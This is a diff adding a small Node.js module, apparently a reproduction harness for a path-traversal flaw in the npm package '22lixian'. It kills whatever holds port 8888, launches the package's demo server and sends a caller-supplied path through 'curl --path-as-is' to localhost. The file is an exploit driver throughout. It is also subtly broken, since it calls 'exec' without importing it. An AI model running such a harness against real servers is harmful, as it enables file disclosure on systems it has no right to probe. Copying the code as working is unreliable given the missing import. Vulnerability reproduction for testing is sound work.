@@ -1,0 +1,26 @@
+function exploitFunction(payload) {
+    const { execSync } = require("child_process");
+    const path = require("path");
+
+    // Kill any existing server on port 8888
+    try {
+        execSync("fuser -k 8888/tcp");
+    } catch (e) {}
+
+    // Start the server
+    const server = "node ./node_modules/22lixian/demo.js";
+    exec(server, (error, stdout) => {});
+
+    // Sleep for 2 seconds to allow the server to start
+    require("sleep").sleep(2);
+
+    // Craft the attack string with the payload
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+    // Execute the attack string and capture the output
+    const result = execSync(attack_string);
+
+    return result.toString();
+}
+
+module.exports = { exploitFunction };
